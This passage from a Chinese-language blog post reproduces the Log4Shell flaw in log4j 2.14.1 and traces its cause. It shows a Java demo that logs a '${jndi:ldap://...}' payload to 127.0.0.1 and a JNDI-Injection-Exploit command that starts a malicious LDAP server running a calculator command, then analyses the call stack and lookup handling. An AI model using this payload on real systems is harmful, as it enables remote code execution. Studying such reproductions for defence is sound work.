</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;artifactId&gt;</span>log4j-api<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;version&gt;</span>2.14.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;artifactId&gt;</span>log4j-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="font-weight:bold">&lt;version&gt;</span>2.14.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;/dependencies&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后给出示例代码</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.logging.log4j.LogManager;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.logging.log4j.Logger;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> main {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">final</span> Logger logger = LogManager.<span style="color:#007f7f">getLogger</span>(main.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) {
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// java 版本过本，给定的几个java版本默认设置trustURLCodebase为False
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        System.<span style="color:#007f7f">setProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;com.sun.jndi.ldap.object.trustURLCodebase&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>        logger.<span style="color:#007f7f">error</span>(<span style="color:#0ff;font-weight:bold">&#34;${jndi:ldap://127.0.0.1:1389/#exploit}&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后借用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n</a>师傅提供的JDNI注入集成工具启动恶意服务器，用来给 ldap/rmi 调用返回恶意代码</p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;open /System/Applications/Calculator.app&quot; -A &quot;127.0.0.1&quot;</code>:</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918190833712.png" alt="image-20220918190833712"  />
</p>
<p>将生成的可利用的恶意服务器<code>ldap</code>的地址:<code>ldap://127.0.0.1:1389/up14yk</code></p>
<p>使用<code>logger.error()</code>来触发漏洞</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220918191027951.png" alt="image-20220918191027951"  />
</p>
<p>可以看到漏洞复现完毕，利用方法是很简单的，只需要log4j2版本满足要求，一旦在log字符串中检测到<code>${}</code>，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。</p>
<h2 id="0x04-漏洞原理分析">0x04 漏洞原理分析<a hidden class="anchor" aria-hidden="true" href="#0x04-漏洞原理分析">#</a></h2>
<p>这里主要参考<a href="https://su18.org/post/log4j2/#%E5%85%B3%E9%94%AE%E7%82%B9%E5%88%86%E6%9E%90"><code>su18</code></a>大佬的关于log4j2漏洞的分析。主要对于Log4j2关于<code>Lookup</code>功能的使用以及漏洞的触发几个关键点进行阐述。</p>
<p>首先查看漏洞触发函数栈的调用情况，我们在最后执行jndi远程命令执行的地方打下断点。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>lookup:172, JndiManager (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">net</span>)
</span></span><span style="display:flex;"><span>lookup:56, JndiLookup (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>lookup:221, Interpolator (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>resolveVariable:1110, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>substitute:1033, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>substitute:912, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>replace:467, StrSubstitutor (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">lookup</span>)
</span></span><span style="display:flex;"><span>format:132, MessagePatternConverter (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">pattern</span>)
</span></span><span style="display:flex;"><span>format:38, PatternFormatter (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">pattern</span>)
</span></span><span style="display:flex;"><span>toSerializable:344, PatternLayout$PatternSerializer (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>toText:244, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>encode:229, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>encode:59, PatternLayout (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">layout</span>)
</span></span><span style="display:flex;"><span>directEncodeEvent:197, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>tryAppend:190, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>append:181, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>tryCallAppender:156, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppender0:129, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppenderPreventRecursion:120, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppender:84, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppenders:540, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>processLogEvent:498, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:481, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:456, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:63, DefaultReliabilityStrategy (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:161, Logger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>)
</span></span><span style="display:flex;"><span>tryLogMessage:2205, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessageTrackRecursion:2159, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessageSafely:2142, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessage:2017, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logIfEnabled:1983, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>error:740, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>main:18, main
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="日志记录触发点">日志记录/触发点<a hidden class="anchor" aria-hidden="true" href="#日志记录触发点">#</a></h3>
<p>根据函数栈，这里是根据<code>logger</code>等级调用对应的方法</p>
<p>我们通过<code>LogManager.getLogger()</code>来获取一个<code>Logger</code>对象，然后调用其<code>debug/info/error/warn/fatal/trace/log</code> 等方法记录日志等信息。这些方法，都会首先使用<code>org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled</code>的若干个重载方法来根据当前配置记录日志等级，判断是否需要输出console和记录日志文件。</p>
<p>在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;Configuration&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;Loggers&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;Logger</span> <span style="color:#007f7f">name=</span><span style="color:#0ff;font-weight:bold">&#34;org.reus09&#34;</span> <span style="color:#007f7f">level=</span><span style="color:#0ff;font-weight:bold">&#34;All&#34;</span><span style="font-weight:bold">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;/Loggers&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/Configuration&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以使用如下代码来配置输出等级：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>LoggerContext ctx          = (LoggerContext) LogManager.<span style="color:#007f7f">getContext</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>Configuration config       = ctx.<span style="color:#007f7f">getConfiguration</span>();
</span></span><span style="display:flex;"><span>LoggerConfig  loggerConfig = config.<span style="color:#007f7f">getLoggerConfig</span>(LogManager.<span style="color:#007f7f">ROOT_LOGGER_NAME</span>);
</span></span><span style="display:flex;"><span>loggerConfig.<span style="color:#007f7f">setLevel</span>(Level.<span style="color:#007f7f">ALL</span>);
</span></span><span style="display:flex;"><span>ctx.<span style="color:#007f7f">updateLoggers</span>();
</span></span></code></pre></td></tr></table>
</div>
</div><p>本此漏洞的触发点，实际上是从 <code>AbstractLogger#logMessage</code> 方法开始的，凡是调用了此方法的 info/error/warn 等全部方法均可以作为本次漏洞的触发点，只是取决于配置的漏洞输出等级。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919163156264.png" alt="image-20220919163156264"  />
</p>
<p>可以看到<code>AbstarctLooger</code>实际上是实现了<code>Logger</code>提供的接口。</p>
<h3 id="消息格式化">消息格式化<a hidden class="anchor" aria-hidden="true" href="#消息格式化">#</a></h3>
<p>这里是调用<code>MessagePatternConverter</code>里面的<code>format</code>方法来实现格式化。</p>
<p>Log4j2 使用 <code>org.apache.logging.log4j.core.pattern.MessagePatternConverter</code> 来对日志消息进行处理，在实例化 MessagePatternConverter 时会从 Properties 及 Options 中获取配置来判断是否需要提供 Lookups 功能。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.<span style="color:#007f7f">getProperties</span>().<span style="color:#007f7f">getBooleanProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;log4j2.formatMsgNoLookups&#34;</span>, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">private</span> MessagePatternConverter(<span style="color:#fff;font-weight:bold">final</span> Configuration config, <span style="color:#fff;font-weight:bold">final</span> String[] options) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">super</span>(<span style="color:#0ff;font-weight:bold">&#34;Message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">formats</span> = options;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">config</span> = config;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">int</span> noLookupsIdx = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">loadNoLookups</span>(options);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">noLookups</span> = Constants.<span style="color:#007f7f">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> || noLookupsIdx &gt;= 0;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">textRenderer</span> = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">loadMessageRenderer</span>(noLookupsIdx &gt;= 0 ? (String[])ArrayUtils.<span style="color:#007f7f">remove</span>(options, noLookupsIdx) : options);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到在<code>2.14.1</code>版本的log4j2它默认的<code>log4j2.formatMsgLookups</code>配置值为<code>false</code>，因此<code>Lookups</code>功能默认是开启的。</p>
<p>然后查看<code>format</code>方法，调用<code>StrSubsitutor</code>方法进行字符串替换</p>
